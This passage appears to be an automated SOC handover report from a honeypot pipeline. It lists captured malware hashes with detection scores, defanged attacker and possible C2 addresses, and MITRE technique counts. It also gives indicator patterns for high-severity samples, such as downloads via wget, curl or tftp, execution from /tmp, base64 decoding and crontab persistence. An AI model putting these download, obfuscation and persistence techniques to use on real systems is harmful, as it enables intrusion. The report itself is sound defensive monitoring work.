| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 45/100 | 🟡 MEDIUM | **14/75** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 41/100 | 🟡 MEDIUM | **29/75** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 62/100 | 🟡 MEDIUM | **7/75** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 45/100 | 🟡 MEDIUM | **14/75** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 85/100 | 🔴 HIGH | **38/75** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 61/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `7b61a0032297d2b400d3dd5e69556a8ca31adb717464c247aaf997f4b4de26f6` | Unknown binary | `7b61a0032297d2b4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4` | ELF Binary (Linux executable) (unknown (e_machine=0x14) 32-bit) | `80e404f6a1b7c293...` | 42/100 | 🟡 MEDIUM | **6/75** 🔴 |
| `88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` | ELF Binary (Linux executable) (x86-64 64-bit) | `88d028a54a136782...` | 87/100 | 🔴 HIGH | **42/74** 🔴 |
| `8e7395ed4110a27c717f63cd7e039b19939c87c9283710108ebc38946f4fbf98` | Shell Script | `8e7395ed4110a27c...` | 60/100 | 🟡 MEDIUM | **2/75** 🔴 |
| `938d5d3054da170715410084aef8fc7d029a4adf6e622b4245619ec0cc3bddf2` | ELF Binary (Linux executable) (MIPS 32-bit) | `938d5d3054da1707...` | 41/100 | 🟡 MEDIUM | **4/75** 🔴 |
| `9646ec7df450cf35e898623f8eb1dd3fe66569730156d0bb055d04ebb5272afc` | Unknown binary | `9646ec7df450cf35...` | 55/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `97a1e6f817d44a4f8b07fdebaf9357786742096c470eb5d78e789b6bb53979bb` | ELF Binary (Linux executable) (x86-64 64-bit) | `97a1e6f817d44a4f...` | 42/100 | 🟡 MEDIUM | **30/73** 🔴 |
| `b1633346a694467b99d9596fe36d0cc88ff1f82f8e86f1c53d3218de1839a43e` | Python Script | `b1633346a694467b...` | 60/100 | 🟡 MEDIUM | 0/76 ✅ |
| `b1e4374da060cb4bf9ff872f3e060486d9cd400519e0b2823f61670d64148ab4` | ELF Binary (Linux executable) (x86-64 64-bit) | `b1e4374da060cb4b...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `b20f39fc00d242e706b6c30367ad811c676e0575050a4ec2f30104b696944b49` | ELF Binary (Linux executable) (x86-64 64-bit) | `b20f39fc00d242e7...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `bcc130d7635ef1ef7350d3135bf3e4abb606dce75f1972636144f96b12839425` | Bash Script | `bcc130d7635ef1ef...` | 74/100 | 🔴 HIGH | **35/75** 🔴 |
| `c8545034cd4fe71eeadb24dacddc5da95c4311c7112c299f1325801f3e06f928` | ELF Binary (Linux executable) (x86 32-bit) | `c8545034cd4fe71e...` | 85/100 | 🔴 HIGH | **39/74** 🔴 |
| `ce3cb467257e402122e4ab5f3f40fefcbdb4a662664659672a38967ee8aaaad0` | ELF Binary (Linux executable) (x86-64 64-bit) | `ce3cb467257e4021...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `d0f5cafd9fb6a363a8b97c84a3546f601a4ba10d49cdd7dae418288caec6940b` | ELF Binary (Linux executable) (x86 32-bit) | `d0f5cafd9fb6a363...` | 44/100 | 🟡 MEDIUM | **10/75** 🔴 |
| `d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e` | Bash Script | `d46555af1173d22f...` | 70/100 | 🔴 HIGH | **26/75** 🔴 |
| `dbb7ebb960dc0d5a480f97ddde3a227a2d83fcaca7d37ae672e6a0a6785631e9` | ELF Binary (Linux executable) (AArch64 64-bit) | `dbb7ebb960dc0d5a...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `ea73a088909b53110444807188562c406c6c6c89b3748aee016bc996ab1f1318` | Unknown binary | `ea73a088909b5311...` | 55/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `eaf9adb4bb80316a3aafceabc0f2ed2aed7c76cf134b9b7c66226fc4f003aa97` | ELF Binary (Linux executable) (x86-64 64-bit) | `eaf9adb4bb80316a...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `f11dd1e4a3d27eef85d44154d662ce94234ee71b54468aeb2c23edb30b74a5c5` | ELF Binary (Linux executable) (x86-64 64-bit) | `f11dd1e4a3d27eef...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/73** 🔴 |
| `f772dbf0e0b8bc9e935686d287f63b6577a7a08110350b745ff8e066cb753b8b` | Unknown binary | `f772dbf0e0b8bc9e...` | 10/100 | 🟢 LOW | Not in VT |
| `tmp4vwws8i2` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmph0z5bqd1` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpktf8uk4r` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpn81tmdfj` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` (88d028a54a136782982817d1...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`bcc130d7635ef1ef7350d3135bf3e4abb606dce75f1972636144f96b12839425` (bcc130d7635ef1ef7350d313...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`c8545034cd4fe71eeadb24dacddc5da95c4311c7112c299f1325801f3e06f928` (c8545034cd4fe71eeadb24da...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e` (d46555af1173d22f07c37ef9...)_
- `Execution from /tmp` — `/tmp/clean_crontab`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `129.153.145[.]135` | US | Oracle Corporation | **100** ⚠️ | 8 |
| `45.198.224[.]120` | NL | VPSVAULT.HOST LTD | **100** ⚠️ | 3 |
| `120.48.177[.]102` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 11 |
| `64.110.90[.]250` | KR | Oracle Corporation | **100** ⚠️ | 4 |
| `206.81.2[.]201` | US | DigitalOcean, LLC | **100** ⚠️ | 9 |
| `209.99.185[.]59` | CH | SKN Subnet & Telecom Ltd | **100** ⚠️ | 22 |
| `139.19.117[.]129` | DE | Max-Planck-Institut fuer Informatik | **100** ⚠️ | 50 |
| `192.248.150[.]180` | GB | The Constant Company, LLC. | **100** ⚠️ | 45 |
| `192.142.28[.]77` | NL | HostPalace Datacenters Ltd | **100** ⚠️ | 50 |
| `91.230.168[.]255` | US | FR ONYPHE | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 362 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 339 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 6 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 5 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 4 |

---

## 🔕 False Positive Summary (20 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 7 |
| AbuseIPDB score 10 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 11 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 668 cases |
| Tool 34  | Credential Extractor        | ✅ 351 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 13 fingerprints |
| Tool 36  | Command Clustering          | ✅ 7 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 38 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 20 filtered (3.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 21 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 38 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 339 priority case(s) shown individually · 21 recon entry/entries in table (8 group(s) consolidating 296 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-06-25T21:48:43Z_
